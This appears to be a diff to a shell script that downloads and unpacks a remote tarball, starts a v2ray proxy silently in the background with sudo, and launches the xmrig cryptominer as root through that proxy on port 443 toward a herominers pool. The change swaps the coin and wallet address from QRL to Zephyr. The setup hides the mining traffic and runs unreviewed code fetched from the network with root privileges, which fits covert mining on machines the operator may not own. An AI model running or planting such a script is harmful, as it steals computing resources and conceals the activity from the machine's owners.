@@ -4,4 +4,4 @@
 wget https://github.com/prendibs/y/raw/main/x.tar.gz && tar xf x.tar.gz
 nohup sudo ./v2ray run --config=ap.json </dev/null >/dev/null 2>&1 &
 echo "love u fika"
-sudo ./xmrig -B -x 127.0.0.1:443 -o sg.qrl.herominers.com:1166 -u Q01050048715e1cbacaed41ac354a28c5dd8eaa01008e415014f9cf02d9a987d3a73962c02e7b14 -p ap -a rx/0 -k --randomx-1gb-pages
+sudo ./xmrig -B -x 127.0.0.1:443 -o sg.zephyr.herominers.com:1123 -u ZEPHsCjJrhRaXdWH3pXwJp3wbFaXQwUm1ZsNXua7eXo33vkQS9WfZ2tWvhtcAmFFE8JEqcZnCmJP4iNKBVa9bchNBhHPnh7Kp3g -p ap -a rx/0 -k --randomx-1gb-pages
